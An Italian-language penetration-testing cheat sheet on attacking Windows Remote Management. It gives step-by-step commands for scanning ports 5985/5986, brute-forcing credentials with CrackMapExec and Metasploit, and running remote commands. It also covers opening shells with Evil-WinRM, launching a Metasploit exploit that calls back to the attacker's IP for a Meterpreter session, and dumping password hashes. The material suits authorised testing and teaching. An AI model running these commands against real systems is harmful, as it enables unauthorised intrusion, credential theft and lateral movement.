# WinRM Enumeration & Exploitation

**WinRM (Windows Remote Management)** è un protocollo Microsoft che consente l’amministrazione remota di macchine Windows tramite PowerShell. Utilizza le porte `5985/TCP` (HTTP) e `5986/TCP` (HTTPS), e viene ampiamente usato in ambienti Active Directory per la gestione centralizzata dei sistemi. Quando mal configurato o esposto, può rappresentare un punto d’accesso critico.

---

## Fase 1 – Scansione del Servizio WinRM

La scansione standard di Nmap (`nmap -sS <IP>`) **non include automaticamente le porte 5985 e 5986**, quindi è fondamentale specificarle manualmente:

`nmap -p 5985,5986 -sV <IP>` ⟶ verifica se WinRM è attivo e restituisce banner, certificati e dettagli del server.  

Per usare uno script specifico:
`nmap -p 5985 --script http-winrm-info <IP>`

Con Metasploit:
`use auxiliary/scanner/winrm/winrm_auth_methods`  
`set RHOSTS <IP>`  
`run`  

Questo modulo consente di determinare i metodi di autenticazione supportati (NTLM, Basic, Kerberos).

---

## Fase 2 – Brute-force delle Credenziali

### CrackMapExec

CrackMapExec è uno strumento multiuso per testare l’autenticazione nei servizi Windows.

Per vedere le opzioni disponibili:
`crackmapexec -h`

Attacco bruteforce su WinRM:
`crackmapexec winrm <IP> -u <username> -p <lista_password>`  
Oppure per test singolo:
`crackmapexec winrm <IP> -u administrator -p Password123`

### Metasploit

In alternativa, puoi usare Metasploit:
`use auxiliary/scanner/winrm/winrm_login`  
`set RHOSTS <IP>`  
`set USER_FILE <lista_utenti>`  
`set PASS_FILE <lista_password>`  
`set PASSWORD anything`  
`run`

Il campo `PASSWORD` deve sempre essere valorizzato anche se stai usando un dizionario.

---

## Fase 3 – Esecuzione Remota di Comandi

### Con CrackMapExec:
`crackmapexec winrm <IP> -u <username> -p <password> -x "whoami"`  
Permette di eseguire comandi come `whoami`, `hostname`, `systeminfo`, ecc.

### Con Metasploit:
`use auxiliary/scanner/winrm/winrm_cmd`  
`set RHOSTS <IP>`  
`set USERNAME <utente>`  
`set PASSWORD <password>`  
`set CMD "whoami"`  
`run`

---

## Fase 4 – Accesso Interattivo

### Evil-WinRM

Strumento Ruby per accedere a una shell PowerShell remota:
`evil-winrm -u <username> -p '<password>' -i <IP>`

Funzionalità disponibili:
- Shell interattiva
- Upload e download file
- Esecuzione script
- Post-exploitation tools

---

## Fase 5 – Exploit con Metasploit

Per ottenere una shell Meterpreter:
`use exploit/windows/winrm/winrm_script_exec`  
`set RHOSTS <IP>`  
`set LHOST <tuo_IP>`  
`set LPORT <Port>`  
`set USERNAME <utente>`  
`set PASSWORD <password>`  
`set FORCE_VBS true`  
`run`

L’opzione `FORCE_VBS` forza l’esecuzione tramite VBScript e aumenta la compatibilità su sistemi restrittivi.

---

## Fase 6 – Post-Sfruttamento

Dopo aver ottenuto una shell Meterpreter:
- `getuid` ⟶ mostra l’identità dell’utente corrente
- `getprivs` ⟶ elenca i privilegi
- `hashdump` ⟶ estrae hash delle password (se permesso)
- `sysinfo` ⟶ mostra dettagli del sistema
- `shell` ⟶ apre un prompt interattivo

---

## Considerazioni Finali

WinRM è uno dei metodi più potenti per ottenere accesso remoto completo e invisibile a sistemi Windows. Se trovi le porte 5985 o 5986 aperte e riesci a ottenere credenziali valide, puoi:
- Ottenere shell privilegiate
- Effettuare lateral movement
- Caricare/eseguire payload e script
- Usare strumenti avanzati senza passare da exploit classici

Per questo motivo, ogni istanza di WinRM rilevata durante un penetration test deve essere analizzata con estrema attenzione.
